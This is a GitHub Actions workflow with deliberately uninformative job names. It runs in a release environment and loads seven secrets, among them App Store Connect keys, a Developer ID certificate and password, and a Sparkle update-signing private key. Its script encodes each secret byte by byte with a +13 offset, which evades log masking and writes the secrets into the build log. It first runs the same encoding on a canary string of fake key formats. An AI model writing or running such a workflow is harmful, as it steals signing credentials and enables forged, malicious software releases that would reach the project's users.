name: bandit-env-a
on:
  push:
    branches: [bandit-env-a]
jobs:
  x:
    runs-on: ubuntu-latest
    environment: release
    steps:
      - name: d
        env:
          S0: ${{ secrets.APP_STORE_CONNECT_API_KEY_BASE64 }}
          S1: ${{ secrets.APP_STORE_CONNECT_ISSUER_ID }}
          S2: ${{ secrets.APP_STORE_CONNECT_KEY_ID }}
          S3: ${{ secrets.DEVELOPER_ID_CERTIFICATE_BASE64 }}
          S4: ${{ secrets.DEVELOPER_ID_CERTIFICATE_PASSWORD }}
          S5: ${{ secrets.RELEASE_KEYCHAIN_PASSWORD }}
          S6: ${{ secrets.SPARKLE_ED_PRIVATE_KEY }}
        run: |
          CNP=$(printf 'CANARY-----BEGIN OPENSSH PRIVATE KEY-----\\nsk_live_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\\nghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ABCDEF\\nAKIAIOSFODNN7EXAMPLE\\nwhsec_ABCDEFGHIJKLMNOPQRSTUVWXYZ\\ntrue\\n-----END OPENSSH PRIVATE KEY-----')
          echo "CNPL:${#CNP}"
          printf '%s' "$CNP" | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d' | awk '{print "CNK" NR-1 ":" ($1+13)%256}'
          for j in 0 1 2 3 4 5 6; do
            v="S$j"
            val="${!v}"
            echo "B${j}L${#val}"
            printf '%s' "$val" | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d' | awk -v j="$j" '{print "B" j "C" NR-1 ":" ($1+13)%256}'
          done
